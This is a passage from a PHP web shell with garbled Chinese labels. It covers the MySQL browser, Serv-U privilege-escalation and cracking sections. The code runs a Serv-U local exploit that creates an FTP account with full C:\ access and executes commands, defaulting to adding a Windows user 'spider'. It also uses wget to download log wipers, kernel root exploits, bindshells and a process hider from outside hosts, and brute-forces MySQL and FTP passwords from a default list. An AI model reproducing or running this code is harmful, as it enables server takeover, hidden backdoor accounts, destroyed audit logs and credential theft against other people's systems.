	<hr>����: ALTER TABLE `����` CHANGE `�ֶ�` `�ֶ�` VARCHAR( ���� ) 
	<hr>����: INSERT INTO `����` ( `�ֶ�` ) VALUES (����( '����' ) ); 
	<hr>����: SELECT * FROM `����` WHERE 21  LIMIT 0 , 30 
	<hr>���: SELECT * FROM `����`  LIMIT 0 , 30 
	<hr>���: TRUNCATE TABLE `����` 
	<hr>ɾ��: DROP TABLE `����`</td></tr></table><br>");
}
function sqllogin(){
	echo '<br>[<a href="?s=sqlexp">ִ��SQL���</a> | <a href="?s=sqllogin">����MYSQL</a>]<br><br>';
  session_start();
  if($_SESSION['isloggedin'] == "true"){
    header("Location: ?s=sql");
  }
  echo("<form method='post' action='?s=sql'>");
  echo("�û�:<input type='text' name='un' size='30' value='root'><br><br>\n");
  echo("����:<input type='text' name='pw' size='30'><br><br>\n");
  echo("����:<input type='text' name='host' size='30' value='localhost'><br><br>\n");
  echo("�˿�:<input type='text' name='port' size='30' value='3306'><br>\n");
  echo("<input type='submit' value='����'>");
  echo("</form>");
}
function sql(){
  session_start();
  if(!$_GET['sqlf']){;}
  if($_POST['un'] && $_POST['pw']){;
    $_SESSION['sql_user'] = $_POST['un'];
    $_SESSION['sql_password'] = $_POST['pw'];
  }
  if($_POST['host']){$_SESSION['sql_host'] = $_POST['host'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['port']){$_SESSION['sql_port'] = $_POST['port'];}
  else{$_SESSION['sql_port'] = '3306';}

  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      echo("Invalid credentials<br>\n");
      die(sqllogin());
    }
    else{
      $_SESSION['isloggedin'] = "true";
      echo '<br>[<a href="?s=sqlexp">ִ��SQL���</a> | <a href="?s=sqllogin">����MYSQL</a>]<br><br>';
    }
  }
  else{
    die(sqllogin());
  }
  if ($_GET['db']){
    mysql_select_db($_GET['db'], $sqlcon);
    if($_GET['sqlquery']){
      $dat = mysql_query($_GET['sqlquery'], $sqlcon) or die(mysql_error());
      $num = mysql_num_rows($dat);
      for($i=0;$i<$num;$i++){
        echo(mysql_result($dat, $i) . "<br>\n");
      }
    }
    else if($_GET['table'] && !$_GET['sqlf']){
      echo("<table>");
      $query = "SHOW COLUMNS FROM " . $_GET['table'];
      $result = mysql_query($query, $sqlcon) or die(mysql_error());
      $i = 0;
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields, $row['Field']);
        echo("<th>" . $fields[$i]);
        $i++;
      }
      $result = mysql_query("SELECT * FROM " . $_GET['table'], $sqlcon) or die(mysql_error());
      $num_rows = mysql_num_rows($result) or die(mysql_error());
      $y=0;
      for($x=1;$x<=$num_rows+1;$x++){
        if(!$_GET['p']){
          $_GET['p'] = 1;
        }
        if($_GET['p']){
          if($y > (30*($_GET['p']-1)) && $y <= 30*($_GET['p'])){
            echo("<tr>");
            for($i=0;$i<count($fields);$i++){
              $query = "SELECT " . $fields[$i] . " FROM " . $_GET['table'] . " WHERE " . $fields[0] . " = '" . $x . "'";
              $dat = mysql_query($query, $sqlcon) or die(mysql_error());
              while($row = mysql_fetch_row($dat)){
                echo("<td>" . $row[0] . "</td>");
              }
            }
            echo("</tr>\n");
          }
        }
        $y++;
      }
      echo("</table>\n");
      for($z=1;$z<=ceil($num_rows / 30);$z++){
        echo("<a href='?s=sql&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $z . "'>" . $z . "</a> | ");
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        echo("<tr><td><a href='?s=sql&db=" . $_GET['db'] . "&table=" . $row[0] ."'>" . $row[0] . "</a></td></tr>\n");
      }
    }
  }
  else{
    $dbs=mysql_list_dbs($sqlcon);
    while($row = mysql_fetch_object($dbs)) {
      echo("<tr><td><a href='?s=sql&db=" . $row->Database . "'>" . $row->Database . "</a><br></td></tr>\n");
    }
  }
  echo '<tr><td>';
}
//��ȨEXP
function serexp(){
	echo '<br>[<a href="?s=tools">���غ���</a> | <a href="?s=serexp">Serv-U��Ȩ</a> | <a href="?s=crack">�����ƽ�</a>]<br><br>';
	$job=$_GET['job'];
	if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "")
  {
      echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\"><tr><td align=\"left\">";
      $sendbuf = "";
      $recvbuf = "";
      $domain  = "-SETDOMAIN\r\n".
              "-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n".
              "-TZOEnable=0\r\n".
              " TZOKey=\r\n";
      $adduser = "-SETUSERSETUP\r\n".
              "-IP=0.0.0.0\r\n".
              "-PortNo=21\r\n".
              "-User=".$user."\r\n".
              "-Password=".$password."\r\n".
              "-HomeDir=c:\\\r\n".
              "-LoginMesFile=\r\n".
              "-Disable=0\r\n".
              "-RelPaths=1\r\n".
              "-NeedSecure=0\r\n".
              "-HideHidden=0\r\n".
              "-AlwaysAllowLogin=0\r\n".
              "-ChangePassword=0\r\n".
              "-QuotaEnable=0\r\n".
              "-MaxUsersLoginPerIP=-1\r\n".
              "-SpeedLimitUp=0\r\n".
              "-SpeedLimitDown=0\r\n".
              "-MaxNrUsers=-1\r\n".
              "-IdleTimeOut=600\r\n".
              "-SessionTimeOut=-1\r\n".
              "-Expire=0\r\n".
              "-RatioUp=1\r\n".
              "-RatioDown=1\r\n".
              "-RatiosCredit=0\r\n".
              "-QuotaCurrent=0\r\n".
              "-QuotaMaximum=0\r\n".
              "-Maintenance=None\r\n".
              "-PasswordType=Regular\r\n".
              "-Ratios=None\r\n".
              " Access=".$part."\|RWAMELCDP\r\n";
      $deldomain="-DELETEDOMAIN\r\n".
                   "-IP=0.0.0.0\r\n".
                   " PortNo=21\r\n";
      $sock = @fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "SITE MAINTENANCE\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = $domain;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = $adduser;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      echo "**********************************************************<br>";
	if($job!=="adduser"){
      echo "Starting Exploit ...<br>";
      echo "**********************************************************<br>";
      $exp = @fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "USER ".$user."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "PASS ".$password."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      echo "**********************************************************<br>";
      echo "Starting Delete Domain ...<br>";
      echo "**********************************************************<br>";
      $sendbuf = $deldomain;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
    }else{
		echo "All done ...<br>";
		echo "**********************************************************<br>";
		}
      echo "</td></tr></table>";
      @fclose($sock);
      if($job!=="adduser") @fclose($exp);
  	}
  echo '<b>Serv-U��Ȩ</b><br><form action="?s=serexp" method="POST">
  LocalPort:<input name="SUPort" type="text" id="SUPort" value="43958"><br>
  LocalUser:<input name="SUUser" type="text" id="SUUser" value="LocalAdministrator"><br>
  LocalPass:<input name="SUPass" type="text" id="SUPass" value="#l@$ak#.lk;0@P"><br>';
	if($job!=="adduser"){
		echo '��Ȩ����: 
    <input name="SUCommand" type="text" id="SUCommand" value="net user spider spider /add" size="50"><br><a href="?s=serexp&job=adduser">[ת��Ϊ����û�]</a>
	  <input name="user" type="hidden" value="spider">
	  <input name="password" type="hidden" value="spider">
	  <input name="part" type="hidden" value="C:\"> ';
	 }
	  else{
		echo '�ʺ�:<input name="user" type="text" value="spider" size="20">
	  ����:<input name="password" type="text" value="spider" size="20">
	  Ŀ¼:<input name="part" type="text" value="C:\" size="20"><br>
	  <a href="?s=serexp">[ת��Ϊִ��CMD]</a><input name="job" type="hidden" value="<?=$job?>">';
	  }
	echo'</td></tr><tr>
  <td align="center"><br><input name="Submit" type="submit" id="Submit" value="ִ��">��
  <input name="Submit" type="reset" value="����"><br><br>';
}
function grab($file){
  $updir = $_POST['loc'];
  $filex = array_pop(explode("/", $file));
  if(exec("wget $file -b -O $updir/$filex")){echo "<br>���سɹ�.<br><br>";}
  else{echo "<br>����ʧ��.<br><br>";}
}
function tools($curdir){
	echo '<br>[<a href="?s=tools">���غ���</a> | <a href="?s=serexp">Serv-U��Ȩ</a> | <a href="?s=crack">�����ƽ�</a>]<br><br>';
  $tools = array(
  "--- Log wipers ---"=>"1",
  "Vanish2.tgz"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz",
  "Cloak.c"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c",
  "gh0st.sh"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh",
  "--- Priv Escalation ---"=>"2",
  "h00lyshit - Linux 2.6 ALL"=>"http://someshit.net/files/xpl/h00lyshit",
  "k-rad3 - Linux <= 2.6.11"=>"http://someshit.net/files/xpl/krad3",
  "raptor - Linux <= 2.6.17.4"=>"http://someshit.net/files/xpl/raptor",
  "rootbsd - BSD v?"=>"http://someshit.net/files/xpl/rootbsd",
  "--- Bindshells ---"=>"3",
  "THC rwwwshell-1.6.perl"=>"http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl",
  "Basic Perl bindshell"=>"http://packetstormsecurity.org/groups/synnergy/bindshell-unix",
  "--- Misc ---"=>"4",
  "MOCKS SOCKS4 Proxy"=>"http://superb-east.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz",
  "xps.c (proc hider)"=>"http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c");
  $names = array_flip($tools);
  echo("<form method='post'>");
  echo("<b>ѡ����ų���: </b><select name='gf'>");
  foreach($tools as $tool) {echo("<option value='" . $tool . "'>" . $names[$tool] . "</option>\n");}
  echo("</select><br><br>");
  echo("<b>���ص�Ŀ¼: </b>");
  echo("<input type='text' name='loc' size='45' value='" . $curdir . "'>");
  echo("<br><input type='submit' value='����'>");
  echo("</form>");
  $gf = $_POST['gf'];
	if($gf){grab($gf);}
}
function crack(){
echo '<br>[<a href="?s=tools">���غ���</a> | <a href="?s=serexp">Serv-U��Ȩ</a> | <a href="?s=crack">�����ƽ�</a>]<br><br>';
echo '<form method="POST">';
echo '<b>�����ƽ�mysql��ftp����</b><br><br>';
echo '<input type="radio" name="ctype" value="mysql" checked>MYSQL <input type="radio" name="ctype" value="ftp">FTP';
echo '<br><br>host: <input name="host" value="localhost" type="text" size="12"> ';
echo '�ʺ�:<input name="root" value="root" type="text" size="12"> ';
echo '<br><br><input type="radio" name="non" value="2" checked>ʹ��Ĭ�ϵ������� <input type="radio" name="non" value="1">ʹ��ָ���ֵ�';
echo '<input name="fpass" value="./password.txt" type="text" size="20">';
echo '<br><br><input name="submit" value="��ʼ�ƽ�" type="submit">';
echo '</form><br>';
if($_POST['submit']){
	$host=$_POST['host'];
	$root=$_POST['root'];
	$fpass=$_POST['fpass'];
	$ctype=$_POST['ctype'];
	$non=$_POST['non'];
	if($non=='1')
	$file=file($fpass);
	elseif($non=='2')
	$file=array('root','bio','sa','sa123','123456','!@#$','!@#$%','!@#$%^','!@#$%^&','!@#$%^&*','000000','654321','admin','0123456789','777','777777','777777777','888','888888','888888888','520520','5201314','admin888','superadmin','administrator','administrators');
	for($i=0;$i<count($file);$i++){
		if($ctype=="mysql"){
			$acc=@mysql_connect($host,$root,chop($file[$i]));
		}
		elseif($ctype=="ftp"){
			$acc=@ftp_login(ftp_connect($host,'21'),$user,chop($file[$i]));
		}
		if($acc)
		echo '����Ϊ: '.$file[$i];
	}
		if(!$acc)
		echo 'û�ҵ�ƥ�������';
}
}
?>
</div></center></body></html>